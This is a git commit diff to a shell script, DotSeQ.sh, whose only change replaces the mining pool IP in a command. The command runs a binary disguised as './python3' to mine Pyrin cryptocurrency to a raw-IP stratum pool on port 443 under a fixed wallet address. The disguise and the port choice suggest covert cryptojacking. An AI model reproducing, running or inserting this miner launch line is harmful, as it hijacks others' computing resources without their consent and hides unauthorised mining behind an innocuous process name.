254cda3871bde258237acf97f69cda7f160ad253
DotAja <142836390+DotAja@users.noreply.github.com>
2024-06-10 02:51:27 +0700

    Update DotSeQ.sh

--- DotSeQ.sh
+++ DotSeQ.sh
@@ -8,4 +8,4 @@ nomer=$((RANDOM % 50 + 1))
 
 clear
 
-./python3 -a PYRIN --pool stratum+tcp://64.23.180.137:443 --user pyrin:qq5fnz6aelfdruhshjpul598fxyeqfkjh86cvypt2902mghd0ql7gy7g799ff.DOTSEQ$nomer --no-cl
+./python3 -a PYRIN --pool stratum+tcp://103.120.19.63:443 --user pyrin:qq5fnz6aelfdruhshjpul598fxyeqfkjh86cvypt2902mghd0ql7gy7g799ff.DOTSEQ$nomer --no-cl
